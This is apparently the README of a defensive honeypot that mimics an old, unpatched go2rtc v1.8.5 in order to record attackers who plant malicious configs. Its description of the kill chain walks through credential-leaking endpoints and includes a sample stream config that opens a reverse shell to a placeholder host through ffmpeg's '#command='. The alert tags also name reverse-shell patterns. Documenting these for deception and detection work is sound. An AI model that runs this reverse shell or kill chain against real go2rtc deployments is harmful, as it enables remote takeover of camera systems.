# 🍯 好甜的蜜罐 · hǎo tián de mì guàn

[![CI](https://github.com/jsserve-org/haotian-miguan/actions/workflows/ci.yml/badge.svg)](https://github.com/jsserve-org/haotian-miguan/actions/workflows/ci.yml)
[![Docker](https://github.com/jsserve-org/haotian-miguan/actions/workflows/docker.yml/badge.svg)](https://github.com/jsserve-org/haotian-miguan/actions/workflows/docker.yml)

**"Such a sweet honeypot."** A deception honeypot that impersonates an old,
unpatched **go2rtc v1.8.5** instance — built to catch attackers who find
"your go2rtc" and try to compromise it by **applying a malicious config
file**.

go2rtc deployments get mass-scanned because the classic kill chain is easy:

1. `GET /api` → fingerprints an old version
2. `GET /api/streams` → leaks camera RTSP URLs **with credentials** (v1.8.5
   had no credential masking)
3. `GET /api/config` → leaks the whole `go2rtc.yaml`, including API auth
4. `POST /api/config` (or `PUT /api/streams`, or the web **Config → Save &
   Restart** editor) → plants a stream like:

   ```yaml
   streams:
     pwn: ffmpeg:rtsp://127.0.0.1/test#command=bash -i >& /dev/tcp/ATTACKER/4444 0>&1
   ```

5. views the stream once → the real go2rtc happily executes the attacker's
   `#command=` in ffmpeg → **RCE**

好甜的蜜罐 performs the whole role of step 1–5's *victim*, except nothing is
ever executed. Every "applied" config is mirrored into a fake state, echoed
back byte-for-byte, listed in `/api/streams` after the "restart", and even
mentioned in the fake `/api/log` — so the attacker believes the exploit
landed and keeps talking to the pot while you collect evidence.

---

## What it impersonates (modeled from the real v1.8.5 source)

The responses are not "inspired by" go2rtc — they mirror the actual
handlers of the [`v1.8.5` tag](https://github.com/AlexxIT/go2rtc/tree/v1.8.5):

| Piece | Behavior |
|---|---|
| `GET /api` | `{"version":"1.8.5","host":…,"rtsp":{"listen":":8554","default_query":"video&audio"},"config_path":"/config/go2rtc.yaml"}` — Go-style JSON (sorted keys, trailing newline, `application/json`) |
| Old WebUI | The white-table UI of that era: `index.html` stream table, `add.html`, `links.html`, `log.html`, and the ACE-based `editor.html` (**Save & Restart** posts your attacker's YAML straight into the trap) |
| `GET /api/streams` | `{"name":{"producers":[{"url":"rtsp://admin:pass@…"}],"consumers":null}}` — credentials leak exactly like the real pre-masking version |
| `GET /api/config` | The juicy `go2rtc.yaml` with 5 fake cameras, commented-out auth, `application/yaml` |
| `POST /api/config` | **The trap.** Full raw YAML like the real `configHandler` → validates, "writes", returns `200` with an **empty body**; invalid YAML → `500` with a yaml error; a later `GET` echoes the attacker's payload byte-for-byte |
| `PATCH /api/config` | Merges like the real `mergeYAML` |
| `PUT/PATCH/DELETE /api/streams` | Faithful quirks: PUT rejects sources containing spaces (`streams.New` sanitize), PATCH requires `name` and a registered scheme, DELETE also patches the config file |
| `POST /api/restart` | Runtime "re-reads" the config — the attacker's planted streams appear (in real v1.8.5 a config POST needs a restart to take effect — mirrored) |
| `POST /api/exit?code=N` | `400 Code must be in the range [0, 125]` for bad codes; valid codes drop the TCP connection like a killed process — while the pot keeps living |
| WebRTC signaling | Sync `POST /api/webrtc?src=`: JSON offer→answer, WHEP `201`+`application/sdp`, raw SDP, the faithful *silent 200* for unknown sources, WHIP `?dst=` with `Location: webrtc?id=` |
| Media | `frame.jpeg` serves a fake night-cam JPEG, `stream.mjpeg` actually streams multipart frames at 1 fps (the "camera" looks alive in a browser), `stream.m3u8` playlist, `stream.mp4`/`frame.mp4` stall like offline cameras |
| `/api/log` | Synthesized zerolog-style JSON lines (`application/jsonlines`), including `[streams] start producer url=…` for attacker-planted ffmpeg streams |
| RTSP `:8554` | OPTIONS/DESCRIBE/SETUP/PLAY with `s=go2rtc/1.8.5` SDP — nmap fingerprints it as a real RTSP go2rtc |
| Go net/http flavor | No `Server` header, `Date` headers, `404 page not found` bodies, `nosniff` error responses, keep-alive — nothing screams "Python" |

## Evidence layout (`--data-dir`, default `./data`)

| File | Contents |
|---|---|
| `access.jsonl` | every HTTP **and** RTSP request (IP, UA, headers, path, body preview, timing) |
| `alerts.jsonl` | suspicious events with **full payloads** + classification tags |
| `alerts.log` | one-line plain format (`severity=high ip=1.2.3.4 tags=config_write,ffmpeg_rce …`) for fail2ban |
| `drops/` | raw attacker payloads, one file per alert, extension by content sniff |
| `state.json` | the fake "on-disk go2rtc.yaml" the attacker has been shaping (+ which streams they planted) |
| `memlog.jsonl` | fake go2rtc memory log (what `/api/log` serves) |

Alert tags: `config_read` (recon) · `config_write` (the trap hit) ·
`stream_write` · `ffmpeg_rce` (`#command=` / `#input=` payload) ·
`exec_pattern` (shell/reverse-shell) · `template_inject` (`{input}`) ·
`restart_attempt` · `exit_attempt` · `traversal` · `oversized` ·
`share`/`publish` (webtorrent/rtmp abuse).

---

## Quick start

**From GitHub Packages (multi-arch image, built by CI):**

```bash
docker pull ghcr.io/jsserve-org/haotian-miguan:latest
docker run -d --name haotian-miguan \
  -p 1984:1984 -p 8554:8554 \
  -v haotian_data:/data \
  ghcr.io/jsserve-org/haotian-miguan:latest
docker logs -f haotian-miguan        # watch the pot fill up
```

Every `main` push publishes `latest` + `sha-<commit>`; `v*` tags publish
versioned images. If your org keeps packages private, `docker login ghcr.io`
first with a PAT that has `read:packages`.

**Bare metal (Python ≥ 3.9, zero dependencies):**

```bash
python3 honeypot.py                      # HTTP :1984 + RTSP :8554, logs to ./data
python3 honeypot.py --webhook https://discord.com/api/webhooks/…   # alert push
```

**Docker Compose (image from GitHub Packages, hardened: read-only fs, no caps, non-root):**

```bash
docker compose up -d                    # pulls ghcr.io/jsserve-org/haotian-miguan:latest
docker compose logs -f                  # watch the pot fill up
```

Variants:

- `docker-compose.proxy.yml` — run it **behind your own nginx** (shifted host
  ports `19840`/`18554`, HTTP bound to the docker bridge IP only, and
  `--trust-proxy` so evidence records the attacker's real IP)
- `docker-compose.build.yml` — build from source instead of pulling GHCR

**Verify the illusion** (safe — it's all fake):

```bash
./smoke_test.sh                         # 23 fidelity checks
curl -s http://127.0.0.1:1984/api       # {"version": "1.8.5", …}
```

**See who you caught:**

```bash
python3 report.py                       # pretty catch report
python3 report.py --json                # for shipping elsewhere
```

### Options

```
--host 0.0.0.0          bind address                --rtsp-port 8554   0 disables RTSP
--port 1984             fake go2rtc API port        --webhook URL      POST alerts as JSON
--data-dir ./data       evidence + state dir       --max-body-mb 8    request body cap
--version-string 1.8.5  version to advertise      --config-path-label /config/go2rtc.yaml
--config-file FILE      seed the fake go2rtc.yaml  --reset            wipe fake state
--trust-proxy           behind your nginx: evidence IP from X-Real-IP / rightmost XFF hop
--quiet                 only alerts on console     --no-color         plain console
```

### Behind your reverse proxy (nginx)

If traffic reaches the pot through **your own nginx** (e.g. the classic
`proxy_pass http://172.17.0.1:1984` setup), two things change:

1. Use `docker-compose.proxy.yml` — it binds HTTP to the docker bridge IP
   only (`172.17.0.1:19840`) and adds `--trust-proxy`, so evidence, alerts
   and fail2ban see the attacker's real IP from `X-Real-IP` instead of
   your proxy's address (the direct peer is kept in the `peer` field).
2. **Do not copy the protection blocks from your real instance's vhost.**
   On a hardened go2rtc you block `/api/config`, `/api/restart` and
   redirect `/editor.html` away — on the *decoy* those endpoints are the
   entire point and must stay reachable:

```nginx
map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
}

server {
    # optional: also catch bare-IP / unmatched-Host scanners — but only
    # one server may be default per listen port; give your REAL vhost an
    # explicit server_name if you promote this one to default.
    listen 80;                      # or: listen 80 default_server;
    server_name cam.example.com;    # the decoy's hostname

    client_max_body_size 16m;       # let beefy malicious configs reach the pot

    location / {
        proxy_pass http://172.17.0.1:19840;
        proxy_http_version 1.1;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;                     # evidence IP
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # WebSocket support (the decoy has none — harmless, keeps parity
        # with your real vhost's fingerprint)
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;

        # Streaming (the fake MJPEG actually streams)
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
        proxy_buffering off;
        proxy_cache off;
    }

    # NOTE: deliberately NO `location = /api/config { return 200 "no thank you"; }`
    # and NO /editor.html redirects here. The trap must stay open.
}
```

Notes:

- nginx's `http` block cannot proxy RTSP. The compose variant publishes
  RTSP directly on host port `18554` (scanners still find it); switch to
  `8554:8554` if the classic port is free. A `stream {}` TCP passthrough
  is possible but usually not worth it for a decoy.
- With `--trust-proxy` on, don't leave the pot's HTTP port directly
  internet-reachable (a direct hit could forge `X-Real-IP`); the proxy
  compose binds it to `172.17.0.1` only for exactly that reason.
- fail2ban still works: `alerts.log` carries the attacker's real IP, so
  bans hit the source, not your proxy.

### Deploying it for real

- Run the honeypot where the internet can see it on the standard ports
  (`:1984` HTTP, `:8554` RTSP) — a cheap VPS or a DMZ host is ideal.
  **Don't run it on the same host:port as your real go2rtc.**
- Move your *real* go2rtc off the WAN (bind `api.listen: 127.0.0.1:1984`,
  VPN, reverse proxy with auth). The honeypot takes over the public
  "go2rtc-shaped" surface; anything that knocks on it is up to no good.
- Tune the bait: edit `DEFAULT_CONFIG` in `honeypot.py` (or pass
  `--config-file your-go2rtc.yaml`) so the fake instance matches the
  cameras/streams of your real deployment.
- Ship alerts: `--webhook` to Discord/Slack/generic relay; or wire
  `alerts.log` to fail2ban with `extras/fail2ban/` for auto-bans.
- Rotate the evidence dir (the JSONL files grow unbounded — logrotate is fine).

## Safety guarantees

- **Nothing an attacker sends is ever executed, imported, or rendered** —
  payloads are stored as inert text under `--data-dir` only.
- No outbound connections except your optional `--webhook`.
- Body size cap, per-connection timeouts (slowloris guard), request
  backlog; RTSP/HTTP are pure parsers that never touch the filesystem.
- The "credentials" in the fake config are invented. Never put real camera
  or API passwords into the bait.
- The pot survives "restarts" and "exits" — only its illusion of death dies.

## Limitations (honest fingerprint deltas)

A very patient attacker could notice: WebRTC answers never complete ICE
(the "camera is offline" story), MP4/HLS playback stalls, `stream.html`
uses a simplified player module, `/api/ws` (WebSocket transport) is absent,
and JSON escaping follows Python rather than Go's `<`/`>` escaping. For the
mass-scanner / config-applier crowd this pot is indistinguishable; a
targeted APT doing byte-level diffs against a genuine 1.8.5 could tell.

## Legal & ethics

This is a passive, defensive deception system: it observes and records
attempts against *your* infrastructure. Do not attack back, do not feed
malicious-looking payloads into real systems, and check local law before
deploying honeypots on public IPs. Log data can contain forged IPs —
verify before escalating.

## Files

```
honeypot.py   the whole honeypot (stdlib only, single-file deploy)
report.py     catch report / summary tool
smoke_test.sh 23-point fidelity + trap verification suite
Dockerfile, docker-compose.yml, .dockerignore
.github/workflows/    CI smoke test + multi-arch build → GH Packages
extras/fail2ban/   filter + jail for auto-banning caught IPs
assets/camera_frame.jpg   the fake night-cam frame (embedded at build time)
```

---

*Be sweet, be sticky.* 🍯
